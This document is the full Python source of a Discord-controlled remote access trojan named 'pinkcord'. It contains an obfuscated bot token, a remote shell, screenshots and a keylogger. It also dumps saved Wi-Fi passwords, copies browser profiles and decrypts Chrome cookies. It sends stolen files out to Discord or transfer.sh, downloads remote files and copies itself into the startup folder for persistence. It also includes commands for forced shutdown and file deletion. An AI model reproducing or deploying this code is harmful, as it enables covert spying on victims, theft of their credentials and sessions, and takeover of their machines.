from time import sleep
import discord
from discord.ext import commands
import pyautogui
import requests
import base64
import codecs
import threading
import os
import json
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from keyboard import read_event
from subprocess import call
from zipfile import ZipFile
import random
import shutil
import pyperclip
import ctypes

while True:
    try:
        hshfasudf = "<TOKEN>"
        hshfasudf = codecs.decode(hshfasudf, 'rot13')
        hshfasudf = base64.b32decode(hshfasudf)
        hshfasudf = base64.b64decode(hshfasudf)
        hshfasudf = hshfasudf.decode('ascii')
        bot = commands.Bot(command_prefix="!")

        def gensesion():
            global sesja
            sesja = random.randint(1, 1000000)
            sesja = str(sesja)

        gensesion()

        def get_public_ip():
            global ipaddres
            response = requests.get("http://checkip.amazonaws.com")
            ipaddres = response.text.strip()
        get_public_ip()

        def grab_info():
            zipObj = ZipFile('log.zip', 'w')
            os.system("ipconfig /displaydns > net_log.txt")
            os.system("netsh wlan show profile * key=clear >> net_log.txt")
            os.system("arp -a >> net_log.txt")
            os.system("ipconfig /all >> net_log.txt")
            os.system("systeminfo > hardware_log.txt")
            os.system("set >> system_log.txt")
            os.system("net user >> system_log.txt")
            os.system("net accounts >> system_log.txt")
            os.system("mkdir chrome")
            os.system(r'copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default" chrome')
            zipObj.write('net_log.txt')
            zipObj.write('hardware_log.txt')
            zipObj.write('system_log.txt')
            for root, dirs, files in os.walk('chrome'):
                for file in files:
                    zipObj.write(os.path.join(root, file))
            os.system("del /F /Q chrome && rd chrome")
            os.system("mkdir edge")
            os.system(r'copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default" edge')
            for root, dirs, files in os.walk('edge'):
                for file in files:
                    zipObj.write(os.path.join(root, file))
            os.system("del /F /Q edge && rd edge")
            os.system("del net_log.txt")
            os.system("del hardware_log.txt")
            os.system("del system_log.txt")
            zipObj.close()


        log = ""
        def keyloggerSTART():
            global log
            while True:
                    event = read_event()
                    if event.event_type == 'down' and len(event.name) == 1 or event.name == 'space' or event.name == 'enter' or event.name == 'backspace':
                        if event.name == 'space':
                            event.name = " "
                        else:
                            if event.name == 'enter':
                                event.name = '[Enter]'
                            else:
                                if event.name == 'backspace':
                                    event.name = '[Backspace]'
                        log += event.name
        
        def cookieSteal():
            conn = sqlite3.connect(f'{os.path.expanduser("~")}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies')
            cursor = conn.cursor()
            logs_file = open("c.txt", "w")
            with open(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Local State", 'r', encoding="utf-8") as file:
                encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
                encrypted_key = base64.b64decode(encrypted_key)
                encrypted_key = encrypted_key[5:]
                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            cursor.execute('SELECT host_key, name, value, encrypted_value from cookies')
            for host_key, name, value, encrypted_value in cursor.fetchall():
                try:
                    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
                    decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
                except:
                    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or "0"
                cookie =  "Host Key:", host_key + " " + "Name:", name + " " + "Value:", decrypted_value.decode('utf-8') + " \n"
                logs_file.writelines(cookie)
            conn.close()

        @bot.event
        async def on_ready():
            print("pinkcord is ready")

        @bot.command()  
        async def shell(ctx, *args):
            session = args[0]
            output = args[1]
            command = " ".join(args[2:])
            if session == "all":
                if output == "yes":
                    out = os.popen(command).read()
                    await ctx.send(out)
                else:
                    os.system(command)
            else:
                if session == sesja:
                    if output == "yes":
                        out = os.popen(command).read()
                        await ctx.send(out)
                    else:
                        os.system(command)

        @bot.command()
        async def ss(ctx, session):
            if session == "all":
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save('ss.png')
                await ctx.send(f"Screen from {sesja}:", file=discord.File("ss.png"))
                os.remove("ss.png")
            else:
                if session == sesja:
                    myScreenshot = pyautogui.screenshot()
                    myScreenshot.save('ss.png')
                    await ctx.send(f"Screen from {sesja}:", file=discord.File("ss.png"))
                    os.remove("ss.png")

        @bot.command()
        async def keylogger(ctx, sesion, action):
            global log
            if sesion == "all":
                if action == "start":
                    sys = threading.Thread(target=keyloggerSTART, name="sys")
                    sys.start()
                else:
                    if action == "log":
                        await ctx.send(log)
                        log = ""
                    else:
                        if action == "stop":
                            stop_event = threading.Event()
                            stop_event.set()
                            sys.join()
                            log = ""
                            
                        
            else:
                if sesion == sesja:
                    if action == "start":
                        sys = threading.Thread(target=keyloggerSTART, name="sys")
                        sys.start()
                    else:
                        if action == "log":
                            await ctx.send(log)
                            log = ""
                        else:
                            if action == "stop":
                                stop_event = threading.Event()
                                stop_event.set()
                                sys.join()
                                log = ""

        @bot.command()
        async def steal(ctx, sesion, *args):
            file_names = " ".join(args)
            if sesion == "all":
                size = os.path.getsize(file_names)
                if size > 8000000:
                    with open(file_names, 'rb') as file:
                        out = requests.put(f"https://transfer.sh/{file_names}", data=file)
                    await ctx.send(f"stolen {out.text}")
                else:
                    await ctx.send("stolen", file=discord.File(file_names))
            else:
                if sesion == sesja:
                    size = os.path.getsize(file_names)
                    if size > 8000000:
                        with open(file_names, 'rb') as file:
                            out = requests.put(f"https://transfer.sh/{file_names}", data=file)
                        await ctx.send(f"stolen {out.text}")
                    else:
                        await ctx.send("stolen", file=discord.File(file_names))

        @bot.command()
        async def info(ctx, sesion):
            if sesion == "all":
                grab_info()
                await ctx.send(ipaddres, file=discord.File("log.zip"))
                os.system("del log.zip")
            else:
                if sesion == sesja:
                    grab_info()
                    await ctx.send(ipaddres, file=discord.File("log.zip"))
                    os.system("del log.zip")
                

        @bot.command()
        async def cd(ctx, sesion, *args):
            dir = " ".join(args)
            if sesion == "all":
                os.chdir(dir)
            else:
                if sesion == sesja:
                    os.chdir(dir)

        @bot.command()
        async def up(ctx, sesion):
            x = 0
            if sesion == "all":
                while x < 100:
                    pyautogui.press('volumeup')
                    x = x + 1
            else:
                if sesion == sesja:
                    while x < 100:
                        pyautogui.press('volumeup')
                        x = x + 1

        @bot.command()
        async def down(ctx, sesion):
            x = 0
            if sesion == "all":
                while x < 100:
                    pyautogui.press('volumedown')
                    x = x + 1
            else:
                if sesion == sesja:
                    while x < 100:
                        pyautogui.press('volumedown')
                        x = x + 1

        @bot.command()
        async def delete(ctx, session, path):
            if session == "all":
                try:
                    os.remove(path)
                    await ctx.send(f"File '{path}' has been deleted.")
                except Exception as e:
                    await ctx.send(f"An error occurred: {e}")
            else:
                if session == sesja:
                    try:
                        os.remove(path)
                        await ctx.send(f"File '{path}' has been deleted.")
                    except Exception as e:
                        await ctx.send(f"An error occurred: {e}")

        @bot.command()
        async def message(ctx, sesion, *args):
            title = args[0]
            button = args[1]
            message = " ".join(args[2:])
            if sesion == "all":
                pyautogui.alert(text=message , title=title , button=button)
            else:
                if sesion == sesja:
                    pyautogui.alert(text=message , title=title , button=button)
                    

        @bot.command()
        async def dir(ctx, sesion):
            if sesion == "all":
                await ctx.send(os.getcwd())
                output = os.popen("dir").read()
                await ctx.send(output)
            else:
                if sesion == sesja:
                    await ctx.send(os.getcwd())
                    output = os.popen("dir").read()
                    await ctx.send(output)

        @bot.command()
        async def upload(ctx, sesion, link = "", filename = "file.txt"):
            if sesion == "all":
                r = requests.get(link)
                with open(filename, 'wb') as f:
                    f.write(r.content)
                await ctx.send("uploaded")
            else:
                if sesion == sesja:
                    r = requests.get(link)
                    with open(filename, 'wb') as f:
                        f.write(r.content)
                    await ctx.send("uploaded")

        @bot.command()
        async def klik(ctx, session, x = "0", y = "0"):
            if session == "all":
                pyautogui.click(x=int(x), y=int(y))
            else:
                if session == sesja:
                    pyautogui.click(x=int(x), y=int(y))
        
        @bot.command()
        async def chrome(ctx, session, action):
            if session == "all":
                if action == "cookie":
                    cookieSteal()
                    await ctx.send(f"stolen from {sesja}", file=discord.File("c.txt"))
                    os.system("del c.txt")
            else:
                if session == sesja:
                    if action == "cookie":
                        cookieSteal()
                        await ctx.send(f"stolen from {sesja}", file=discord.File("c.txt"))
                        os.system("del c.txt")

        @bot.command()
        async def press(ctx, session, klawisz = "Enter"):
            if session == "all":
                pyautogui.press(klawisz)
            else:
                if session == sesja:
                    pyautogui.press(klawisz)
        
        @bot.command()
        async def cli(ctx, session):
            if session == "all":
                text = pyperclip.paste()
                await ctx.send(text)
            else:
                if session == sesja:
                    text = pyperclip.paste()
                    await ctx.send(text)
                    

        @bot.command()
        async def write(ctx, session, *args):
            if session == "all":
                pyautogui.write(" ".join(args))
            else:
                if session == sesja:
                    pyautogui.write(" ".join(args))

        @bot.command()
        async def loc(ctx, session):
            if session == "all":
                r = requests.get(f"http://ip-api.com/json/{ipaddres}")
                await ctx.send(r.text)
            else:
                if session == sesja:
                    r = requests.get(f"http://ip-api.com/json/{ipaddres}")
                    await ctx.send(r.text)
        
        @bot.command()
        async def cdrom(ctx, session):
            if session == "all":
                call("powershell -Command (New-Object -com 'WMPlayer.OCX').cdromcollection.item(0).Eject()", shell=True)
            else:
                if session == sesja:
                    call("powershell -Command (New-Object -com 'WMPlayer.OCX').cdromcollection.item(0).Eject()", shell=True)

        
        @bot.command()
        async def startup(ctx, session, *args):
            appdata_path = os.path.expandvars('%appdata%')
            startupFolder = os.path.join(appdata_path, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            filePATH = " ".join(args)
            if session == "all":
                shutil.copy(filePATH, startupFolder)
            else:
                if session == sesja:
                    shutil.copy(filePATH, startupFolder)

        @bot.command()
        async def sessions(ctx):
            await ctx.send(sesja + " is the session ip address: " + ipaddres)
        
        @bot.command()
        async def rename(ctx, session, *args):
            global sesja
            if session == sesja:
                nowaSesja = " ".join(args)
                await ctx.send("session name changed " + sesja + " to " + nowaSesja)
                sesja = nowaSesja

        @bot.command()
        async def shutdown(ctx, session):
            if session == "all":
                os.system("shutdown /s /f /t 1")
            else:
                if session == sesja:
                    os.system("shutdown /s /f /t 1")

        @bot.command()
        async def restart(ctx, session):
            if session == "all":
                os.system("powershell.exe Restart-Computer -Force")
                await ctx.send(f"The remote system {sesja} is being restarted.")
            else:
                if session == sesja:
                    os.system("powershell.exe Restart-Computer -Force")
                    await ctx.send(f"The remote system {sesja} is being restarted.")
        
        @bot.command()
        async def wallpaper(ctx, session, *args):
            if session == "all":
                filePATH = " ".join(args)
                filePATH = os.path.abspath(filePATH)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
                await ctx.send(f"wallpaper changed successfully")
            else:
                if session == sesja:
                    filePATH = " ".join(args)
                    filePATH = os.path.abspath(filePATH)
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
                    await ctx.send(f"wallpaper changed successfully")
        
        @bot.command()
        async def h(ctx):
            wiadomosc = '''
!shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
!ss [session] - Captures a screenshot from a remote computer.
!keylogger [session] [action(start, stop, log)] - Starts or stops a keylogger on a remote computer.
!steal [session] [file_names] - Steals files from a remote computer.
!info [session] - Retrieves information about the remote computer system.
!cd [session] [path] - Changes the current directory on the remote computer.
!up [session] - Increases the volume on the remote computer.
!down [session] - Decreases the volume on the remote computer.
!message [session] [title] [button] [message] - Displays a message on the remote computer.
!dir [session] - Displays the current directory on the remote computer.
!upload [session] [link] [file_name] - Sends a file to the remote computer.
!click [session] [x] [y] - Clicks at a specific location on the screen.
!press [session] [key] - Presses a specific key (default: Enter).
!cli [session] - Copies the clipboard content.
!write [session] [message] - Types using the keyboard.
!loc [session] - Displays IP information.
!cdrom [session] - Opens the CD-ROM drive.
!sessions - Displays all sessions.
!rename [session] [new_name] - Changes the name of a session.
!startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
!shutdown [session] - Shutdown the remote computer.
!restart [session] - Restart the remote computer.
!chrome [session] [action(cookie)] - steals selected data from chrome
!delete [session] [path] -  Deletes a file from the remote computer.
!wallpaper [session] [path] -  changes the wallpaper on the remote computer.
            '''
            await ctx.send(wiadomosc)

        bot.run(hshfasudf)
    except:
        print("no token or internet")
        sleep(20)
